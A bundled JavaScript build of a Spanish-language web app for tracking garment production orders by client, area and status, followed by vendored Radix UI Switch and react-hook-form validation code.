          /* @__PURE__ */ jsx48(SelectTrigger2, { children: /* @__PURE__ */ jsx48(SelectValue2, { placeholder: "Filtrar por estado" }) }),
          /* @__PURE__ */ jsxs22(SelectContent2, { children: [
            /* @__PURE__ */ jsx48(SelectItem2, { value: "all", children: "Todos los Estados" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "active", children: "En Proceso" }),
            /* @__PURE__ */ jsx48(SelectItem2, { value: "completed", children: "Finalizados" })
          ] })
        ] })
      ] }) })
    ] }),
    /* @__PURE__ */ jsxs22(Card, { children: [
      /* @__PURE__ */ jsx48(CardHeader, { children: /* @__PURE__ */ jsxs22(CardTitle, { children: [
        "Pedidos (",
        filteredOrders.length,
        ")"
      ] }) }),
      /* @__PURE__ */ jsx48(CardContent, { children: isLoading ? /* @__PURE__ */ jsx48("div", { className: "animate-pulse space-y-4", children: [...Array(5)].map((_, i) => /* @__PURE__ */ jsx48("div", { className: "h-16 bg-gray-200 rounded" }, i)) }) : /* @__PURE__ */ jsxs22("div", { className: "overflow-x-auto", children: [
        /* @__PURE__ */ jsxs22(Table, { children: [
          /* @__PURE__ */ jsx48(TableHeader, { children: /* @__PURE__ */ jsxs22(TableRow, { children: [
            /* @__PURE__ */ jsx48(TableHead, { children: "Folio" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "Cliente/Hotel" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "Modelo" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "Tipo" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "Color" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "\xC1rea Actual" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "Piezas" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "Estado" }),
            /* @__PURE__ */ jsx48(TableHead, { children: "Acciones" })
          ] }) }),
          /* @__PURE__ */ jsx48(TableBody, { children: filteredOrders.map((order) => /* @__PURE__ */ jsxs22(TableRow, { children: [
            /* @__PURE__ */ jsxs22(TableCell, { children: [
              /* @__PURE__ */ jsx48("div", { className: "font-medium", children: order.folio }),
              /* @__PURE__ */ jsx48("div", { className: "text-sm text-gray-500", children: order.noSolicitud })
            ] }),
            /* @__PURE__ */ jsx48(TableCell, { children: order.clienteHotel }),
            /* @__PURE__ */ jsx48(TableCell, { className: "font-medium", children: order.modelo }),
            /* @__PURE__ */ jsx48(TableCell, { children: order.tipoPrenda }),
            /* @__PURE__ */ jsx48(TableCell, { children: order.color }),
            /* @__PURE__ */ jsx48(TableCell, { children: /* @__PURE__ */ jsx48(Badge, { className: getAreaBadgeColor(order.currentArea), children: getAreaDisplayName(order.currentArea) }) }),
            /* @__PURE__ */ jsx48(TableCell, { children: order.totalPiezas }),
            /* @__PURE__ */ jsx48(TableCell, { children: /* @__PURE__ */ jsx48(Badge, { className: getStatusBadgeColor(order.status), children: order.status === "completed" ? "Finalizado" : "En Proceso" }) }),
            /* @__PURE__ */ jsx48(TableCell, { children: /* @__PURE__ */ jsxs22("div", { className: "flex space-x-2", children: [
              /* @__PURE__ */ jsx48(
                Button,
                {
                  variant: "ghost",
                  size: "sm",
                  title: "Ver detalles",
                  onClick: () => handleViewDetails(order.id),
                  children: /* @__PURE__ */ jsx48(Eye, { className: "h-4 w-4" })
                }
              ),
              order.status === "active" && /* @__PURE__ */ jsx48(
                Button,
                {
                  variant: "ghost",
                  size: "sm",
                  onClick: () => handleTransferOrder(order.id),
                  title: "Transferir",
                  children: /* @__PURE__ */ jsx48(ArrowRight, { className: "h-4 w-4" })
                }
              ),
              user?.area === "envios" && order.status === "active" && /* @__PURE__ */ jsx48(
                Button,
                {
                  variant: "ghost",
                  size: "sm",
                  onClick: () => completeOrderMutation.mutate(order.id),
                  disabled: completeOrderMutation.isPending,
                  title: "Finalizar pedido",
                  className: "text-green-600 hover:text-green-700",
                  children: /* @__PURE__ */ jsx48(CircleCheckBig, { className: "h-4 w-4" })
                }
              ),
              /* @__PURE__ */ jsx48(
                Button,
                {
                  variant: "ghost",
                  size: "sm",
                  onClick: () => handleViewHistory(order.id),
                  title: "Ver historial",
                  children: /* @__PURE__ */ jsx48(History, { className: "h-4 w-4" })
                }
              ),
              user?.area === "admin" && /* @__PURE__ */ jsx48(
                Button,
                {
                  variant: "ghost",
                  size: "sm",
                  onClick: () => {
                    if (confirm("\xBFEst\xE1s seguro de que quieres eliminar este pedido? Esta acci\xF3n no se puede deshacer.")) {
                      deleteOrderMutation.mutate(order.id);
                    }
                  },
                  disabled: deleteOrderMutation.isPending,
                  title: "Eliminar pedido",
                  className: "text-red-600 hover:text-red-700",
                  children: /* @__PURE__ */ jsx48(Trash2, { className: "h-4 w-4" })
                }
              )
            ] }) })
          ] }, order.id)) })
        ] }),
        filteredOrders.length === 0 && /* @__PURE__ */ jsx48("div", { className: "text-center py-8 text-gray-500", children: "No se encontraron pedidos con los filtros aplicados" })
      ] }) })
    ] }),
    showTransfer && selectedOrderId && /* @__PURE__ */ jsx48(
      TransferModal,
      {
        open: showTransfer,
        onClose: () => setShowTransfer(false),
        orderId: selectedOrderId
      }
    ),
    showHistory && selectedOrderId && /* @__PURE__ */ jsx48(
      OrderHistoryModal,
      {
        open: showHistory,
        onClose: () => setShowHistory(false),
        orderId: selectedOrderId
      }
    ),
    showDetails && selectedOrderId && /* @__PURE__ */ jsx48(
      OrderDetailsModal,
      {
        open: showDetails,
        onClose: () => setShowDetails(false),
        orderId: selectedOrderId
      }
    )
  ] }) });
}

// client/src/components/repositions/RepositionList.tsx
import { useState as useState35 } from "react";

// client/src/components/ui/switch.tsx
import * as React59 from "react";

// node_modules/@radix-ui/react-switch/dist/index.mjs
import * as React58 from "react";
import { jsx as jsx49, jsxs as jsxs23 } from "react/jsx-runtime";
var SWITCH_NAME = "Switch";
var [createSwitchContext, createSwitchScope] = createContextScope(SWITCH_NAME);
var [SwitchProvider, useSwitchContext] = createSwitchContext(SWITCH_NAME);
var Switch2 = React58.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeSwitch,
      name,
      checked: checkedProp,
      defaultChecked,
      required,
      disabled,
      value = "on",
      onCheckedChange,
      form,
      ...switchProps
    } = props;
    const [button, setButton] = React58.useState(null);
    const composedRefs = useComposedRefs(forwardedRef, (node) => setButton(node));
    const hasConsumerStoppedPropagationRef = React58.useRef(false);
    const isFormControl = button ? form || !!button.closest("form") : true;
    const [checked, setChecked] = useControllableState({
      prop: checkedProp,
      defaultProp: defaultChecked ?? false,
      onChange: onCheckedChange,
      caller: SWITCH_NAME
    });
    return /* @__PURE__ */ jsxs23(SwitchProvider, { scope: __scopeSwitch, checked, disabled, children: [
      /* @__PURE__ */ jsx49(
        Primitive.button,
        {
          type: "button",
          role: "switch",
          "aria-checked": checked,
          "aria-required": required,
          "data-state": getState2(checked),
          "data-disabled": disabled ? "" : void 0,
          disabled,
          value,
          ...switchProps,
          ref: composedRefs,
          onClick: composeEventHandlers(props.onClick, (event) => {
            setChecked((prevChecked) => !prevChecked);
            if (isFormControl) {
              hasConsumerStoppedPropagationRef.current = event.isPropagationStopped();
              if (!hasConsumerStoppedPropagationRef.current) event.stopPropagation();
            }
          })
        }
      ),
      isFormControl && /* @__PURE__ */ jsx49(
        SwitchBubbleInput,
        {
          control: button,
          bubbles: !hasConsumerStoppedPropagationRef.current,
          name,
          value,
          checked,
          required,
          disabled,
          form,
          style: { transform: "translateX(-100%)" }
        }
      )
    ] });
  }
);
Switch2.displayName = SWITCH_NAME;
var THUMB_NAME = "SwitchThumb";
var SwitchThumb = React58.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSwitch, ...thumbProps } = props;
    const context = useSwitchContext(THUMB_NAME, __scopeSwitch);
    return /* @__PURE__ */ jsx49(
      Primitive.span,
      {
        "data-state": getState2(context.checked),
        "data-disabled": context.disabled ? "" : void 0,
        ...thumbProps,
        ref: forwardedRef
      }
    );
  }
);
SwitchThumb.displayName = THUMB_NAME;
var BUBBLE_INPUT_NAME2 = "SwitchBubbleInput";
var SwitchBubbleInput = React58.forwardRef(
  ({
    __scopeSwitch,
    control,
    checked,
    bubbles = true,
    ...props
  }, forwardedRef) => {
    const ref = React58.useRef(null);
    const composedRefs = useComposedRefs(ref, forwardedRef);
    const prevChecked = usePrevious(checked);
    const controlSize = useSize(control);
    React58.useEffect(() => {
      const input = ref.current;
      if (!input) return;
      const inputProto = window.HTMLInputElement.prototype;
      const descriptor = Object.getOwnPropertyDescriptor(
        inputProto,
        "checked"
      );
      const setChecked = descriptor.set;
      if (prevChecked !== checked && setChecked) {
        const event = new Event("click", { bubbles });
        setChecked.call(input, checked);
        input.dispatchEvent(event);
      }
    }, [prevChecked, checked, bubbles]);
    return /* @__PURE__ */ jsx49(
      "input",
      {
        type: "checkbox",
        "aria-hidden": true,
        defaultChecked: checked,
        ...props,
        tabIndex: -1,
        ref: composedRefs,
        style: {
          ...props.style,
          ...controlSize,
          position: "absolute",
          pointerEvents: "none",
          opacity: 0,
          margin: 0
        }
      }
    );
  }
);
SwitchBubbleInput.displayName = BUBBLE_INPUT_NAME2;
function getState2(checked) {
  return checked ? "checked" : "unchecked";
}
var Root6 = Switch2;
var Thumb = SwitchThumb;

// client/src/components/ui/switch.tsx
import { jsx as jsx50 } from "react/jsx-runtime";
var Switch3 = React59.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx50(
  Root6,
  {
    className: cn(
      "peer inline-flex h-6 w-11 shrink-0 cursor-pointer items-center rounded-full border-2 border-transparent transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:ring-offset-background disabled:cursor-not-allowed disabled:opacity-50 data-[state=checked]:bg-primary data-[state=unchecked]:bg-input",
      className
    ),
    ...props,
    ref,
    children: /* @__PURE__ */ jsx50(
      Thumb,
      {
        className: cn(
          "pointer-events-none block h-5 w-5 rounded-full bg-background shadow-lg ring-0 transition-transform data-[state=checked]:translate-x-5 data-[state=unchecked]:translate-x-0"
        )
      }
    )
  }
));
Switch3.displayName = Root6.displayName;

// client/src/components/repositions/RepositionForm.tsx
import { useState as useState33 } from "react";

// node_modules/react-hook-form/dist/index.esm.mjs
import * as React60 from "react";
import React__default from "react";
var isCheckBoxInput = (element) => element.type === "checkbox";
var isDateObject = (value) => value instanceof Date;
var isNullOrUndefined = (value) => value == null;
var isObjectType = (value) => typeof value === "object";
var isObject = (value) => !isNullOrUndefined(value) && !Array.isArray(value) && isObjectType(value) && !isDateObject(value);
var getEventValue = (event) => isObject(event) && event.target ? isCheckBoxInput(event.target) ? event.target.checked : event.target.value : event;
var getNodeParentName = (name) => name.substring(0, name.search(/\.\d+(\.|$)/)) || name;
var isNameInFieldArray = (names, name) => names.has(getNodeParentName(name));
var isPlainObject2 = (tempObject) => {
  const prototypeCopy = tempObject.constructor && tempObject.constructor.prototype;
  return isObject(prototypeCopy) && prototypeCopy.hasOwnProperty("isPrototypeOf");
};
var isWeb = typeof window !== "undefined" && typeof window.HTMLElement !== "undefined" && typeof document !== "undefined";
function cloneObject(data) {
  let copy;
  const isArray = Array.isArray(data);
  const isFileListInstance = typeof FileList !== "undefined" ? data instanceof FileList : false;
  if (data instanceof Date) {
    copy = new Date(data);
  } else if (data instanceof Set) {
    copy = new Set(data);
  } else if (!(isWeb && (data instanceof Blob || isFileListInstance)) && (isArray || isObject(data))) {
    copy = isArray ? [] : {};
    if (!isArray && !isPlainObject2(data)) {
      copy = data;
    } else {
      for (const key in data) {
        if (data.hasOwnProperty(key)) {
          copy[key] = cloneObject(data[key]);
        }
      }
    }
  } else {
    return data;
  }
  return copy;
}
var isKey = (value) => /^\w*$/.test(value);
var isUndefined = (val) => val === void 0;
var compact = (value) => Array.isArray(value) ? value.filter(Boolean) : [];
var stringToPath = (input) => compact(input.replace(/["|']|\]/g, "").split(/\.|\[/));
var get = (object, path, defaultValue) => {
  if (!path || !isObject(object)) {
    return defaultValue;
  }
  const result = (isKey(path) ? [path] : stringToPath(path)).reduce((result2, key) => isNullOrUndefined(result2) ? result2 : result2[key], object);
  return isUndefined(result) || result === object ? isUndefined(object[path]) ? defaultValue : object[path] : result;
};
var isBoolean = (value) => typeof value === "boolean";
var set = (object, path, value) => {
  let index2 = -1;
  const tempPath = isKey(path) ? [path] : stringToPath(path);
  const length = tempPath.length;
  const lastIndex = length - 1;
  while (++index2 < length) {
    const key = tempPath[index2];
    let newValue = value;
    if (index2 !== lastIndex) {
      const objValue = object[key];
      newValue = isObject(objValue) || Array.isArray(objValue) ? objValue : !isNaN(+tempPath[index2 + 1]) ? [] : {};
    }
    if (key === "__proto__" || key === "constructor" || key === "prototype") {
      return;
    }
    object[key] = newValue;
    object = object[key];
  }
};
var EVENTS = {
  BLUR: "blur",
  FOCUS_OUT: "focusout",
  CHANGE: "change"
};
var VALIDATION_MODE = {
  onBlur: "onBlur",
  onChange: "onChange",
  onSubmit: "onSubmit",
  onTouched: "onTouched",
  all: "all"
};
var INPUT_VALIDATION_RULES = {
  max: "max",
  min: "min",
  maxLength: "maxLength",
  minLength: "minLength",
  pattern: "pattern",
  required: "required",
  validate: "validate"
};
var HookFormContext = React__default.createContext(null);
HookFormContext.displayName = "HookFormContext";
var getProxyFormState = (formState, control, localProxyFormState, isRoot = true) => {
  const result = {
    defaultValues: control._defaultValues
  };
  for (const key in formState) {
    Object.defineProperty(result, key, {
      get: () => {
        const _key = key;
        if (control._proxyFormState[_key] !== VALIDATION_MODE.all) {
          control._proxyFormState[_key] = !isRoot || VALIDATION_MODE.all;
        }
        localProxyFormState && (localProxyFormState[_key] = true);
        return formState[_key];
      }
    });
  }
  return result;
};
var useIsomorphicLayoutEffect3 = typeof window !== "undefined" ? React60.useLayoutEffect : React60.useEffect;
var isString = (value) => typeof value === "string";
var generateWatchOutput = (names, _names, formValues, isGlobal, defaultValue) => {
  if (isString(names)) {
    isGlobal && _names.watch.add(names);
    return get(formValues, names, defaultValue);
  }
  if (Array.isArray(names)) {
    return names.map((fieldName) => (isGlobal && _names.watch.add(fieldName), get(formValues, fieldName)));
  }
  isGlobal && (_names.watchAll = true);
  return formValues;
};
var appendErrors = (name, validateAllFieldCriteria, errors, type, message2) => validateAllFieldCriteria ? {
  ...errors[name],
  types: {
    ...errors[name] && errors[name].types ? errors[name].types : {},
    [type]: message2 || true
  }
} : {};
var convertToArrayPayload = (value) => Array.isArray(value) ? value : [value];
var createSubject = () => {
  let _observers = [];
  const next = (value) => {
    for (const observer of _observers) {
      observer.next && observer.next(value);
    }
  };
  const subscribe = (observer) => {
    _observers.push(observer);
    return {
      unsubscribe: () => {
        _observers = _observers.filter((o) => o !== observer);
      }
    };
  };
  const unsubscribe = () => {
    _observers = [];
  };
  return {
    get observers() {
      return _observers;
    },
    next,
    subscribe,
    unsubscribe
  };
};
var isPrimitive = (value) => isNullOrUndefined(value) || !isObjectType(value);
function deepEqual2(object1, object2, _internal_visited = /* @__PURE__ */ new WeakSet()) {
  if (isPrimitive(object1) || isPrimitive(object2)) {
    return object1 === object2;
  }
  if (isDateObject(object1) && isDateObject(object2)) {
    return object1.getTime() === object2.getTime();
  }
  const keys1 = Object.keys(object1);
  const keys2 = Object.keys(object2);
  if (keys1.length !== keys2.length) {
    return false;
  }
  if (_internal_visited.has(object1) || _internal_visited.has(object2)) {
    return true;
  }
  _internal_visited.add(object1);
  _internal_visited.add(object2);
  for (const key of keys1) {
    const val1 = object1[key];
    if (!keys2.includes(key)) {
      return false;
    }
    if (key !== "ref") {
      const val2 = object2[key];
      if (isDateObject(val1) && isDateObject(val2) || isObject(val1) && isObject(val2) || Array.isArray(val1) && Array.isArray(val2) ? !deepEqual2(val1, val2, _internal_visited) : val1 !== val2) {
        return false;
      }
    }
  }
  return true;
}
var isEmptyObject = (value) => isObject(value) && !Object.keys(value).length;
var isFileInput = (element) => element.type === "file";
var isFunction2 = (value) => typeof value === "function";
var isHTMLElement3 = (value) => {
  if (!isWeb) {
    return false;
  }
  const owner = value ? value.ownerDocument : 0;
  return value instanceof (owner && owner.defaultView ? owner.defaultView.HTMLElement : HTMLElement);
};
var isMultipleSelect = (element) => element.type === `select-multiple`;
var isRadioInput = (element) => element.type === "radio";
var isRadioOrCheckbox = (ref) => isRadioInput(ref) || isCheckBoxInput(ref);
var live = (ref) => isHTMLElement3(ref) && ref.isConnected;
function baseGet(object, updatePath) {
  const length = updatePath.slice(0, -1).length;
  let index2 = 0;
  while (index2 < length) {
    object = isUndefined(object) ? index2++ : object[updatePath[index2++]];
  }
  return object;
}
function isEmptyArray(obj) {
  for (const key in obj) {
    if (obj.hasOwnProperty(key) && !isUndefined(obj[key])) {
      return false;
    }
  }
  return true;
}
function unset(object, path) {
  const paths = Array.isArray(path) ? path : isKey(path) ? [path] : stringToPath(path);
  const childObject = paths.length === 1 ? object : baseGet(object, paths);
  const index2 = paths.length - 1;
  const key = paths[index2];
  if (childObject) {
    delete childObject[key];
  }
  if (index2 !== 0 && (isObject(childObject) && isEmptyObject(childObject) || Array.isArray(childObject) && isEmptyArray(childObject))) {
    unset(object, paths.slice(0, -1));
  }
  return object;
}
var objectHasFunction = (data) => {
  for (const key in data) {
    if (isFunction2(data[key])) {
      return true;
    }
  }
  return false;
};
function markFieldsDirty(data, fields = {}) {
  const isParentNodeArray = Array.isArray(data);
  if (isObject(data) || isParentNodeArray) {
    for (const key in data) {
      if (Array.isArray(data[key]) || isObject(data[key]) && !objectHasFunction(data[key])) {
        fields[key] = Array.isArray(data[key]) ? [] : {};
        markFieldsDirty(data[key], fields[key]);
      } else if (!isNullOrUndefined(data[key])) {
        fields[key] = true;
      }
    }
  }
  return fields;
}
function getDirtyFieldsFromDefaultValues(data, formValues, dirtyFieldsFromValues) {
  const isParentNodeArray = Array.isArray(data);
  if (isObject(data) || isParentNodeArray) {
    for (const key in data) {
      if (Array.isArray(data[key]) || isObject(data[key]) && !objectHasFunction(data[key])) {
        if (isUndefined(formValues) || isPrimitive(dirtyFieldsFromValues[key])) {
          dirtyFieldsFromValues[key] = Array.isArray(data[key]) ? markFieldsDirty(data[key], []) : { ...markFieldsDirty(data[key]) };
        } else {
          getDirtyFieldsFromDefaultValues(data[key], isNullOrUndefined(formValues) ? {} : formValues[key], dirtyFieldsFromValues[key]);
        }
      } else {
        dirtyFieldsFromValues[key] = !deepEqual2(data[key], formValues[key]);
      }
    }
  }
  return dirtyFieldsFromValues;
}
var getDirtyFields = (defaultValues, formValues) => getDirtyFieldsFromDefaultValues(defaultValues, formValues, markFieldsDirty(formValues));
var defaultResult = {
  value: false,
  isValid: false
};
var validResult = { value: true, isValid: true };
var getCheckboxValue = (options) => {
  if (Array.isArray(options)) {
    if (options.length > 1) {
      const values = options.filter((option) => option && option.checked && !option.disabled).map((option) => option.value);
      return { value: values, isValid: !!values.length };
    }
    return options[0].checked && !options[0].disabled ? (
      // @ts-expect-error expected to work in the browser
      options[0].attributes && !isUndefined(options[0].attributes.value) ? isUndefined(options[0].value) || options[0].value === "" ? validResult : { value: options[0].value, isValid: true } : validResult
    ) : defaultResult;
  }
  return defaultResult;
};
var getFieldValueAs = (value, { valueAsNumber, valueAsDate, setValueAs }) => isUndefined(value) ? value : valueAsNumber ? value === "" ? NaN : value ? +value : value : valueAsDate && isString(value) ? new Date(value) : setValueAs ? setValueAs(value) : value;
var defaultReturn = {
  isValid: false,
  value: null
};
var getRadioValue = (options) => Array.isArray(options) ? options.reduce((previous, option) => option && option.checked && !option.disabled ? {
  isValid: true,
  value: option.value
} : previous, defaultReturn) : defaultReturn;
function getFieldValue(_f) {
  const ref = _f.ref;
  if (isFileInput(ref)) {
    return ref.files;
  }
  if (isRadioInput(ref)) {
    return getRadioValue(_f.refs).value;
  }
  if (isMultipleSelect(ref)) {
    return [...ref.selectedOptions].map(({ value }) => value);
  }
  if (isCheckBoxInput(ref)) {
    return getCheckboxValue(_f.refs).value;
  }
  return getFieldValueAs(isUndefined(ref.value) ? _f.ref.value : ref.value, _f);
}
var getResolverOptions = (fieldsNames, _fields, criteriaMode, shouldUseNativeValidation) => {
  const fields = {};
  for (const name of fieldsNames) {
    const field = get(_fields, name);
    field && set(fields, name, field._f);
  }
  return {
    criteriaMode,
    names: [...fieldsNames],
    fields,
    shouldUseNativeValidation
  };
};
var isRegex = (value) => value instanceof RegExp;
var getRuleValue = (rule) => isUndefined(rule) ? rule : isRegex(rule) ? rule.source : isObject(rule) ? isRegex(rule.value) ? rule.value.source : rule.value : rule;
var getValidationModes = (mode) => ({
  isOnSubmit: !mode || mode === VALIDATION_MODE.onSubmit,
  isOnBlur: mode === VALIDATION_MODE.onBlur,
  isOnChange: mode === VALIDATION_MODE.onChange,
  isOnAll: mode === VALIDATION_MODE.all,
  isOnTouch: mode === VALIDATION_MODE.onTouched
});
var ASYNC_FUNCTION = "AsyncFunction";
var hasPromiseValidation = (fieldReference) => !!fieldReference && !!fieldReference.validate && !!(isFunction2(fieldReference.validate) && fieldReference.validate.constructor.name === ASYNC_FUNCTION || isObject(fieldReference.validate) && Object.values(fieldReference.validate).find((validateFunction) => validateFunction.constructor.name === ASYNC_FUNCTION));
var hasValidation = (options) => options.mount && (options.required || options.min || options.max || options.maxLength || options.minLength || options.pattern || options.validate);
var isWatched = (name, _names, isBlurEvent) => !isBlurEvent && (_names.watchAll || _names.watch.has(name) || [..._names.watch].some((watchName) => name.startsWith(watchName) && /^\.\w+/.test(name.slice(watchName.length))));
var iterateFieldsByAction = (fields, action, fieldsNames, abortEarly) => {
  for (const key of fieldsNames || Object.keys(fields)) {
    const field = get(fields, key);
    if (field) {
      const { _f, ...currentField } = field;
      if (_f) {
        if (_f.refs && _f.refs[0] && action(_f.refs[0], key) && !abortEarly) {
          return true;
        } else if (_f.ref && action(_f.ref, _f.name) && !abortEarly) {
          return true;
        } else {
          if (iterateFieldsByAction(currentField, action)) {
            break;
          }
        }
      } else if (isObject(currentField)) {
        if (iterateFieldsByAction(currentField, action)) {
          break;
        }
      }
    }
  }
  return;
};
function schemaErrorLookup(errors, _fields, name) {
  const error = get(errors, name);
  if (error || isKey(name)) {
    return {
      error,
      name
    };
  }
  const names = name.split(".");
  while (names.length) {
    const fieldName = names.join(".");
    const field = get(_fields, fieldName);
    const foundError = get(errors, fieldName);
    if (field && !Array.isArray(field) && name !== fieldName) {
      return { name };
    }
    if (foundError && foundError.type) {
      return {
        name: fieldName,
        error: foundError
      };
    }
    if (foundError && foundError.root && foundError.root.type) {
      return {
        name: `${fieldName}.root`,
        error: foundError.root
      };
    }
    names.pop();
  }
  return {
    name
  };
}
var shouldRenderFormState = (formStateData, _proxyFormState, updateFormState, isRoot) => {
  updateFormState(formStateData);
  const { name, ...formState } = formStateData;
  return isEmptyObject(formState) || Object.keys(formState).length >= Object.keys(_proxyFormState).length || Object.keys(formState).find((key) => _proxyFormState[key] === (!isRoot || VALIDATION_MODE.all));
};
var shouldSubscribeByName = (name, signalName, exact) => !name || !signalName || name === signalName || convertToArrayPayload(name).some((currentName) => currentName && (exact ? currentName === signalName : currentName.startsWith(signalName) || signalName.startsWith(currentName)));
var skipValidation = (isBlurEvent, isTouched, isSubmitted, reValidateMode, mode) => {
  if (mode.isOnAll) {
    return false;
  } else if (!isSubmitted && mode.isOnTouch) {
    return !(isTouched || isBlurEvent);
  } else if (isSubmitted ? reValidateMode.isOnBlur : mode.isOnBlur) {
    return !isBlurEvent;
  } else if (isSubmitted ? reValidateMode.isOnChange : mode.isOnChange) {
    return isBlurEvent;
  }
  return true;
};
var unsetEmptyArray = (ref, name) => !compact(get(ref, name)).length && unset(ref, name);
var updateFieldArrayRootError = (errors, error, name) => {
  const fieldArrayErrors = convertToArrayPayload(get(errors, name));
  set(fieldArrayErrors, "root", error[name]);
  set(errors, name, fieldArrayErrors);
  return errors;
};
var isMessage = (value) => isString(value);
function getValidateError(result, ref, type = "validate") {
  if (isMessage(result) || Array.isArray(result) && result.every(isMessage) || isBoolean(result) && !result) {
    return {
      type,
      message: isMessage(result) ? result : "",
      ref
    };
  }
}
var getValueAndMessage = (validationData) => isObject(validationData) && !isRegex(validationData) ? validationData : {
  value: validationData,
  message: ""
};
var validateField = async (field, disabledFieldNames, formValues, validateAllFieldCriteria, shouldUseNativeValidation, isFieldArray) => {
  const { ref, refs, required, maxLength, minLength, min: min3, max: max3, pattern, validate, name, valueAsNumber, mount } = field._f;
  const inputValue = get(formValues, name);
  if (!mount || disabledFieldNames.has(name)) {
    return {};
  }
  const inputRef = refs ? refs[0] : ref;
  const setCustomValidity = (message2) => {
    if (shouldUseNativeValidation && inputRef.reportValidity) {
      inputRef.setCustomValidity(isBoolean(message2) ? "" : message2 || "");
      inputRef.reportValidity();
    }
  };
  const error = {};
  const isRadio = isRadioInput(ref);
  const isCheckBox = isCheckBoxInput(ref);
  const isRadioOrCheckbox2 = isRadio || isCheckBox;
  const isEmpty = (valueAsNumber || isFileInput(ref)) && isUndefined(ref.value) && isUndefined(inputValue) || isHTMLElement3(ref) && ref.value === "" || inputValue === "" || Array.isArray(inputValue) && !inputValue.length;
  const appendErrorsCurry = appendErrors.bind(null, name, validateAllFieldCriteria, error);
  const getMinMaxMessage = (exceedMax, maxLengthMessage, minLengthMessage, maxType = INPUT_VALIDATION_RULES.maxLength, minType = INPUT_VALIDATION_RULES.minLength) => {
    const message2 = exceedMax ? maxLengthMessage : minLengthMessage;
    error[name] = {
      type: exceedMax ? maxType : minType,
      message: message2,
      ref,
      ...appendErrorsCurry(exceedMax ? maxType : minType, message2)
    };
  };
  if (isFieldArray ? !Array.isArray(inputValue) || !inputValue.length : required && (!isRadioOrCheckbox2 && (isEmpty || isNullOrUndefined(inputValue)) || isBoolean(inputValue) && !inputValue || isCheckBox && !getCheckboxValue(refs).isValid || isRadio && !getRadioValue(refs).isValid)) {
    const { value, message: message2 } = isMessage(required) ? { value: !!required, message: required } : getValueAndMessage(required);
    if (value) {
      error[name] = {
        type: INPUT_VALIDATION_RULES.required,
        message: message2,
        ref: inputRef,
        ...appendErrorsCurry(INPUT_VALIDATION_RULES.required, message2)
      };
      if (!validateAllFieldCriteria) {
        setCustomValidity(message2);
        return error;
      }
    }
  }
  if (!isEmpty && (!isNullOrUndefined(min3) || !isNullOrUndefined(max3))) {
    let exceedMax;
    let exceedMin;
    const maxOutput = getValueAndMessage(max3);
    const minOutput = getValueAndMessage(min3);
    if (!isNullOrUndefined(inputValue) && !isNaN(inputValue)) {
      const valueNumber = ref.valueAsNumber || (inputValue ? +inputValue : inputValue);
      if (!isNullOrUndefined(maxOutput.value)) {
        exceedMax = valueNumber > maxOutput.value;
      }
      if (!isNullOrUndefined(minOutput.value)) {
        exceedMin = valueNumber < minOutput.value;
      }
    } else {
      const valueDate = ref.valueAsDate || new Date(inputValue);
      const convertTimeToDate = (time) => /* @__PURE__ */ new Date((/* @__PURE__ */ new Date()).toDateString() + " " + time);
      const isTime = ref.type == "time";
      const isWeek = ref.type == "week";
      if (isString(maxOutput.value) && inputValue) {
        exceedMax = isTime ? convertTimeToDate(inputValue) > convertTimeToDate(maxOutput.value) : isWeek ? inputValue > maxOutput.value : valueDate > new Date(maxOutput.value);
      }
      if (isString(minOutput.value) && inputValue) {
        exceedMin = isTime ? convertTimeToDate(inputValue) < convertTimeToDate(minOutput.value) : isWeek ? inputValue < minOutput.value : valueDate < new Date(minOutput.value);
      }
    }
    if (exceedMax || exceedMin) {
      getMinMaxMessage(!!exceedMax, maxOutput.message, minOutput.message, INPUT_VALIDATION_RULES.max, INPUT_VALIDATION_RULES.min);
      if (!validateAllFieldCriteria) {
        setCustomValidity(error[name].message);
        return error;
      }
    }
  }
  if ((maxLength || minLength) && !isEmpty && (isString(inputValue) || isFieldArray && Array.isArray(inputValue))) {
    const maxLengthOutput = getValueAndMessage(maxLength);
    const minLengthOutput = getValueAndMessage(minLength);
    const exceedMax = !isNullOrUndefined(maxLengthOutput.value) && inputValue.length > +maxLengthOutput.value;
    const exceedMin = !isNullOrUndefined(minLengthOutput.value) && inputValue.length < +minLengthOutput.value;
    if (exceedMax || exceedMin) {
      getMinMaxMessage(exceedMax, maxLengthOutput.message, minLengthOutput.message);
      if (!validateAllFieldCriteria) {
        setCustomValidity(error[name].message);
        return error;
      }
    }
  }
  if (pattern && !isEmpty && isString(inputValue)) {
    const { value: patternValue, message: message2 } = getValueAndMessage(pattern);
    if (isRegex(patternValue) && !inputValue.match(patternValue)) {
      error[name] = {
        type: INPUT_VALIDATION_RULES.pattern,
        message: message2,
        ref,
        ...appendErrorsCurry(INPUT_VALIDATION_RULES.pattern, message2)
      };
      if (!validateAllFieldCriteria) {
        setCustomValidity(message2);
        return error;
      }
    }
  }
  if (validate) {
    if (isFunction2(validate)) {
      const result = await validate(inputValue, formValues);
      const validateError = getValidateError(result, inputRef);
      if (validateError) {
        error[name] = {
          ...validateError,
          ...appendErrorsCurry(INPUT_VALIDATION_RULES.validate, validateError.message)
        };
        if (!validateAllFieldCriteria) {
          setCustomValidity(validateError.message);
          return error;
        }
      }
    } else if (isObject(validate)) {
      let validationResult = {};
      for (const key in validate) {
        if (!isEmptyObject(validationResult) && !validateAllFieldCriteria) {
          break;
        }
        const validateError = getValidateError(await validate[key](inputValue, formValues), inputRef, key);
        if (validateError) {
          validationResult = {
            ...validateError,
            ...appendErrorsCurry(key, validateError.message)
          };
          setCustomValidity(validateError.message);
          if (validateAllFieldCriteria) {
            error[name] = validationResult;
          }
        }
      }
      if (!isEmptyObject(validationResult)) {
        error[name] = {
          ref: inputRef,
          ...validationResult
        };
        if (!validateAllFieldCriteria) {
          return error;
        }
      }
    }
  }
  setCustomValidity(true);
  return error;
};
var defaultOptions = {
  mode: VALIDATION_MODE.onSubmit,
  reValidateMode: VALIDATION_MODE.onChange,
  shouldFocusError: true
};
